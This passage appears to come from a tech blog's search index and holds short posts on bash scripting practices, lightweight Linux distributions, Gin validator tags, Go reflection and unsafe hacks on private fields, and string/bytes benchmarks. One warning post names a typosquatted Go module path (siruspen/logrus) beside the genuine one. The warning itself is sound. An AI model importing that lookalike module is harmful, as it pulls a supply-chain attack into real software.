Data\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eWhen handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Inefficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitem1\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;apple\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitem2\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;banana\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitem3\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cherry\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Efficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitems\u003cspan style=\"color:#f92672\"\u003e=(\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;apple\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;banana\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cherry\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e item in \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eitems[@]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$item\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"enable-noclobber\"\u003eEnable Noclobber\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eTo prevent accidental overwriting of files.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o noclobber\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"use-functions\"\u003eUse Functions\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eFunctions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch4 id=\"efficient-file-operations\"\u003eEfficient File Operations\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eWhen performing file operations, use efficient techniques to minimize resource usage.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Inefficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e read -r line; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$line\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e \u0026lt; file.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Efficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e IFS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e read -r line; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$line\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e \u0026lt; file.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"parallel-processing\"\u003eParallel Processing\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eTools like \u003ccode\u003exargs\u003c/code\u003e and GNU \u003ccode\u003eparallel\u003c/code\u003e can be incredibly useful.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch4 id=\"error-handling\"\u003eError Handling\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eRobust error handling is critical for creating reliable and maintainable scripts.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Custom Error Messages: Implement custom error messages to provide more context when something goes wrong.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommand1 \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;command1 failed\u0026#34;\u003c/span\u003e; exit 1; \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etrap \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;echo \u0026#34;Error occurred\u0026#34;; cleanup; exit 1\u0026#39;\u003c/span\u003e ERR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e cleanup\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Cleanup code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e -z \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Usage: \u003c/span\u003e$0\u003cspan style=\"color:#e6db74\"\u003e \u0026lt;argument\u0026gt;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Logging: Implement logging to keep track of script execution and diagnose issues.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elogfile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;script.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec \u0026gt; \u0026gt;\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003etee -i $logfile\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Script started\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"automating-complex-system-administration-tasks\"\u003eAutomating Complex System Administration Tasks:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eAutomated Backups\u003c/li\u003e\n\u003cli\u003eSystem Monitoring\u003c/li\u003e\n\u003cli\u003eUser Management\u003c/li\u003e\n\u003cli\u003eAutomated Updates\u003c/li\u003e\n\u003cli\u003eNetwork Configuration\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","SHELL","BASH"],"title":"Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash"},{"categories":["Google","URL","infra","infrastructure","network","switch"],"contents":" Google\u0026rsquo;s 5-generation network architecture in ten years ","date":"September 24, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240924-google-infra/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.kawabangga.com/posts/6624\" target=\"_blank\" rel=\"noopener\"\u003eGoogle\u0026rsquo;s 5-generation network architecture in ten years\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Google","URL","infra","infrastructure","network","switch"],"title":"Google Infra"},{"categories":["golang","URL","security"],"contents":" 提高警惕，供应链攻击就在你我身边 github.com/siruspen/logrus false github.com/sirupsen/logrus true ","date":"September 13, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240913-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://v2ex.com/t/1072079\" target=\"_blank\" rel=\"noopener\"\u003e提高警惕，供应链攻击就在你我身边\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003egithub.com/siruspen/logrus\u003c/code\u003e false\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egithub.com/sirupsen/logrus\u003c/code\u003e true\u003c/li\u003e\n\u003c/ul\u003e","tags":["golang","URL","security"],"title":"Supply chain attack"},{"categories":["Linux","URL","lightweight"],"contents":" lightweight-linux-distributions-for-your-pc Name Site Comment Puppy Linux https://puppylinux-woof-ce.github.io/ This tiny OS weighs in at under 300MB, so it can run smoothly even on systems with as little as 512MB of RAM. Bodhi Linux https://www.bodhilinux.com/ System requirements are just 512MB of RAM and a 500MHz processor. Peppermint OS https://peppermintos.com/ It only needs 512MB of RAM to run, so it will fly on that Pentium 4 machine or Core 2 Duo laptop you have stashed in your closet. While Peppermint OS is light on local resources, it integrates well with cloud and web apps. The OS builds in close integration with services like Dropbox, Google Drive, and more. AntiX https://antixlinux.com/ AntiX is designed to run on systems with as little as 64MB of RAM and a Pentium II processor. Lubuntu https://lubuntu.me/ Lubuntu will run smoothly on computers with as little as 512 MB of RAM and a 1 GHz processor. ","date":"August 20, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240820-linux/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.freecodecamp.org/news/lightweight-linux-distributions-for-your-pc/\" target=\"_blank\" rel=\"noopener\"\u003elightweight-linux-distributions-for-your-pc\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eName\u003c/th\u003e\n          \u003cth\u003eSite\u003c/th\u003e\n          \u003cth\u003eComment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePuppy Linux\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://puppylinux-woof-ce.github.io/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://puppylinux-woof-ce.github.io/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eThis tiny OS weighs in at under 300MB, so it can run smoothly even on systems with as little as 512MB of RAM.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eBodhi Linux\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://www.bodhilinux.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.bodhilinux.com/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eSystem requirements are just 512MB of RAM and a 500MHz processor.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePeppermint OS\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://peppermintos.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://peppermintos.com/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eIt only needs 512MB of RAM to run, so it will fly on that Pentium 4 machine or Core 2 Duo laptop you have stashed in your closet. While Peppermint OS is light on local resources, it integrates well with cloud and web apps. The OS builds in close integration with services like Dropbox, Google Drive, and more.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eAntiX\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://antixlinux.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://antixlinux.com/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eAntiX is designed to run on systems with as little as 64MB of RAM and a Pentium II processor.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLubuntu\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://lubuntu.me/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://lubuntu.me/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eLubuntu will run smoothly on computers with as little as 512 MB of RAM and a 1 GHz processor.\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["Linux","URL","lightweight"],"title":"Lightweight Linux Distributions For Older PCs"},{"categories":["golang","URL","GIN","byte","string"],"contents":" 学会 gin 参数校验之 validator 库，看这一篇就足够了 字符串约束 excludesall：不包含参数中任意的 UNICODE 字符，例如 excludesall=ab\nexcludesrune：不包含参数表示的 rune 字符，excludesrune=asong\nstartswith：以参数子串为前缀，例如 startswith=hi\nendswith：以参数子串为后缀，例如 endswith=bye。\ncontains=：包含参数子串，例如 contains=email\ncontainsany：包含参数中任意的 UNICODE 字符，例如 containsany=ab\ncontainsrune：包含参数表示的 rune 字符，例如`containsrune=asong\nexcludes：不包含参数子串，例如 excludes=email\n范围约束 范围约束的字段类型分为三种：\n对于数值，我们则可以约束其值 对于切片、数组和 map，我们则可以约束其长度 对于字符串，我们则可以约束其长度\n常用 tag 介绍： ne：不等于参数值，例如 ne=5 gt：大于参数值，例如 gt=5 gte：大于等于参数值，例如 gte=50 lt：小于参数值，例如 lt=50 lte：小于等于参数值，例如 lte=50 oneof：只能是列举出的值其中一个，这些值必须是数值或字符串，以空格分隔，如果字符串中有空格，将字符串用单引号包围，例如 oneof=male female。 eq：等于参数值，注意与 len 不同。对于字符串，eq 约束字符串本身的值，而 len 约束字符串长度。例如 eq=10 len：等于参数值，例如 len=10 max：小于等于参数值，例如 max=10 min：大于等于参数值，例如 min=10\nFields 约束 eqfield：定义字段间的相等约束，用于约束同一结构体中的字段。例如：eqfield=Password eqcsfield：约束统一结构体中字段等于另一个字段（相对），确认密码时可以使用，例如：eqfiel=ConfirmPassword nefield：用来约束两个字段是否相同，确认两种颜色是否一致时可以使用，例如：nefield=Color1 necsfield：约束两个字段是否相同（相对）\n常用约束 unique：指定唯一性约束，不同类型处理不同：\n对于 map，unique 约束没有重复的值 对于数组和切片，unique 没有重复的值 对于元素类型为结构体的碎片，unique 约束结构体对象的某个字段不重复，使用 unique=field 指定字段名\nemail：使用 email 来限制字段必须是邮件形式，直接写 eamil 即可，无需加任何指定。\nomitempty：字段未设置，则忽略\n-：跳过该字段，不检验\n|：使用多个约束，只需要满足其中一个，例如 rgb|rgba\nrequired：字段必须设置，不能为默认值\ntype Info struct { CreateTime time.Time `form:\u0026#34;create_time\u0026#34; binding:\u0026#34;required,timing\u0026#34; time_format:\u0026#34;2006-01-02\u0026#34;` UpdateTime time.Time `form:\u0026#34;update_time\u0026#34; binding:\u0026#34;required,timing\u0026#34; time_format:\u0026#34;2006-01-02\u0026#34;` } 没有什么不可能：修改 Go 结构体的私有字段 在我们的 main 函数中，你不能访问 Person 的 age 字段： package main; import ( \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;github.com/smallnest/private/model\u0026#34; ) func main() { p := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) fmt.Printf(\u0026#34;Person: %+v\\n\u0026#34;, p) // fmt.Println(p.age) // error: p.age undefined (cannot refer to unexported field or method age) t := model.NewTeacher(\u0026#34;smallnest\u0026#34;, 18) fmt.Printf(\u0026#34;Teacher: %+v\\n\u0026#34;, t) // Teacher: {Name:Alice Age:30} } 那么真的就无法访问了吗？也不一定，我们可以通过反射的方式访问私有字段：\np := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) age := reflect.ValueOf(p).FieldByName(\u0026#34;age\u0026#34;) fmt.Printf(\u0026#34;原始值: %d, CanSet: %v\\n\u0026#34;, age.Int(), age.CanSet()) // 30, false 运行这个程序，可以看到我们获得了这个私有字段 age 的值：\n原始值: 30, CanSet: false 这里我们以标准库的 sync.Mutex 结构体为例，sync.Mutex 包含两个字段，这两个字段都是私有的： type Mutex struct { state int32 sema uint32 } 正常情况下你只能通过 Mutex.Lock 和 Mutex.Unlock 来间接的修改这两个字段。\n现在我们演示通过 hack 的方式修改 Mutex 的 state 字段的值：\nfunc setPrivateField() { var mu sync.Mutex mu.Lock() field := reflect.ValueOf(\u0026amp;mu).Elem().FieldByName(\u0026#34;state\u0026#34;) state := field.Interface().(*int32) fmt.Println(*state) // ❶ flagField := reflect.ValueOf(\u0026amp;field).Elem().FieldByName(\u0026#34;flag\u0026#34;) flagPtr := (*uintptr)(unsafe.Pointer(flagField.UnsafeAddr())) // 修改 flag 字段的值 *flagPtr \u0026amp;= ^uintptr(flagRO) // ❷ field.Set(reflect.ValueOf(int32(0))) mu.Lock() // ❸ fmt.Println(*state) } type flag uintptr const ( flagKindWidth = 5 // there are 27 kinds flagKindMask flag = 1\u0026lt;\u0026lt;flagKindWidth - 1 flagStickyRO flag = 1 \u0026lt;\u0026lt; 5 flagEmbedRO flag = 1 \u0026lt;\u0026lt; 6 flagIndir flag = 1 \u0026lt;\u0026lt; 7 flagAddr flag = 1 \u0026lt;\u0026lt; 8 flagMethod flag = 1 \u0026lt;\u0026lt; 9 flagMethodShift = 10 flagRO flag = flagStickyRO | flagEmbedRO ) ❶ 处我们已经介绍过了，访问私有字段的值，这里会打印出 1 ❶ 处我们清除了 flag 字段的 flagRO 标志位，这样就不会报 reflect: reflect.Value.SetInt using value obtained using unexported field 错误了 ❸ 处不会导致二次加锁带来的死锁，因为 state 字段的值已经被修改为 0 了，所以不会阻塞。最后打印结果还是 1\n这样我们就可以实现了修改私有字段的值了。\n使用 unexported 字段的 Value 设置公开字段 看 reflect.Value.Set 的源码，我们可以看到它会检查参数的值是否 unexported，如果是，就会报错，下面就是一个例子：\nfunc setUnexportedField2() { alice := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) bob := model.NewTeacher(\u0026#34;Bob\u0026#34;, 40) bobAgent := reflect.ValueOf(\u0026amp;bob).Elem().FieldByName(\u0026#34;Age\u0026#34;) aliceAge := reflect.ValueOf(\u0026amp;alice).Elem().FieldByName(\u0026#34;age\u0026#34;) bobAgent.Set(aliceAge) // ❹ } 注意 ❹ 处，我们尝试把 alice 的私有字段 age 的值赋值给 bob 的公开字段 Age，这里会报错：\npanic: reflect: reflect.Value.Set using value obtained using unexported field goroutine 1 [running]: reflect.flag.mustBeExportedSlow(0x1400012a000?) /usr/local/go/src/reflect/value.go:250 +0x70 reflect.flag.mustBeExported(...) /usr/local/go/src/reflect/value.go:241 reflect.Value.Set({0x102773a60?, 0x1400012a028?, 0x60?}, {0x102773a60?, 0x1400012a010?, 0x1027002b8?}) /usr/local/go/src/reflect/value.go:2320 +0x88 main.setUnexportedField2() /Users/smallnest/workspace/study/private/main.go:50 +0x168 main.main() /Users/smallnest/workspace/study/private/main.go:18 +0x1c exit status 2 原因 alice 的 age 值被识别为私有字段，它是不能用来赋值给公开字段的。\n有了上一节的经验，我们同样可以绕过这个检查，实现这个赋值：\nfunc setUnexportedField2() { alice := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) bob := model.NewTeacher(\u0026#34;Bob\u0026#34;, 40) bobAgent := reflect.ValueOf(\u0026amp;bob).Elem().FieldByName(\u0026#34;Age\u0026#34;) aliceAge := reflect.ValueOf(\u0026amp;alice).Elem().FieldByName(\u0026#34;age\u0026#34;) // 修改 flag 字段的值 flagField := reflect.ValueOf(\u0026amp;aliceAge).Elem().FieldByName(\u0026#34;flag\u0026#34;) flagPtr := (*uintptr)(unsafe.Pointer(flagField.UnsafeAddr())) *flagPtr \u0026amp;= ^uintptr(flagRO) // ❺ bobAgent.Set(reflect.ValueOf(50)) bobAgent.Set(aliceAge) // ❻ } ❺ 处我们修改了 aliceAge 的 flag 字段，去掉了 flagRO 标志位，这样就不会报错了，❻ 处我们成功的把 alice 的私有字段 age 的值赋值给 bob 的公开字段 Age。\n这样我们就可以实现了使用私有字段的值给其他 Value 值进行赋值了。\n给 unaddressable 的值设置值 回到最初的问题，我们尝试给一个 unaddressable 的值设置值，会报错。\n结合上面的 hack 手段，我们也可以绕过限制，给 unaddressable 的值设置值：\nfunc setUnaddressableValue() { var x = 47 v := reflect.ValueOf(x) fmt.Printf(\u0026#34;原始值: %d, CanSet: %v\\n\u0026#34;, v.Int(), v.CanSet()) // 47, false // v.Set(reflect.ValueOf(50)) flagField := reflect.ValueOf(\u0026amp;v).Elem().FieldByName(\u0026#34;flag\u0026#34;) flagPtr := (*uintptr)(unsafe.Pointer(flagField.UnsafeAddr())) // 修改 flag 字段的值 *flagPtr |= uintptr(flagAddr) // 设置可寻址标志位 fmt.Printf(\u0026#34;CanSet: %v\\n\u0026#34;, v.CanSet()) // true v.SetInt(50) fmt.Printf(\u0026#34;修改后的值：%d\\n\u0026#34;, v.Int()) // 50 } 四种字符串和 bytes 互相转换方式的性能比较 三、新型 unsafe 方式 func toBytes(s string) []byte { if len(s) == 0 { return nil } return unsafe.Slice(unsafe.StringData(s), len(s)) } func toString(b []byte) string { if len(b) == 0 { return \u0026#34;\u0026#34; } return unsafe.String(unsafe.SliceData(b), len(b)) } 四、kubernetes 的实现 func toK8sBytes(s string) []byte { return *(*[]byte)(unsafe.Pointer(\u0026amp;s)) } func toK8sString(b []byte) string { return *(*string)(unsafe.Pointer(\u0026amp;b)) } 在 Mac mini M2 上运行，go1.22.6 darwin/arm64，结果如下： goos: darwin goarch: arm64 pkg: github.com/smallnest/study/str2bytes BenchmarkStringToBytes/强制转换-8 78813638\t14.73 ns/op\t16 B/op\t1 allocs/op BenchmarkStringToBytes/传统转换-8 599346962\t2.010 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/新型转换-8 624976126\t1.929 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/k8s转换-8 887370499\t1.211 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/强制转换-8 92011309\t12.68 ns/op\t16 B/op\t1 allocs/op BenchmarkBytesToString/传统转换-8 815922964\t1.471 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/新型转换-8 624965414\t1.922 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/k8s转换-8 1000000000\t1.194 ns/op\t0 